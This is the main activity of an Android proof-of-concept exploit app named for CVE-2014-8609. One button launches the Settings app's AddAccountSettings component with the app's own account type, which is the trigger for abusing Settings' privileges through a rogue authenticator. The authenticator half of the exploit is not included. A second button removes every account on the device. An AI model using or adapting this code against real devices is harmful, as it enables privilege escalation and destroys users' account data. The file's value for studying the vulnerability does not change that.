package com.example.cve_2014_8609_exploit;

import androidx.appcompat.app.AppCompatActivity;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.widget.Button;
import android.widget.Toast;

public class MainActivity extends AppCompatActivity {

    private AccountManager accountManager;

    private Button exploit_btn;
    private Button remove_accounts_btn;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        accountManager = AccountManager.get(this);

        exploit_btn = findViewById(R.id.button_exploit);
        remove_accounts_btn = findViewById(R.id.button_remove_accounts);

        setListener();
    }

    private void setListener()
    {
        exploit_btn.setOnClickListener(view -> {

            Intent intent = new Intent();
            intent.setComponent(new ComponentName("com.android.settings","com.android.settings.accounts.AddAccountSettings"));
            intent.setAction(Intent.ACTION_RUN);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            String authTypes[] = {"com.example.cve_2014_8609_exploit"};

            intent.putExtra("account_types", authTypes);
            startActivity(intent);
        });

        remove_accounts_btn.setOnClickListener(view -> {
            Account[] accounts = accountManager.getAccounts();
            for(Account item : accounts)
                accountManager.removeAccount(item, null,null);
            Toast.makeText(MainActivity.this,"Removing Accounts",Toast.LENGTH_SHORT).show();
        });
    }

}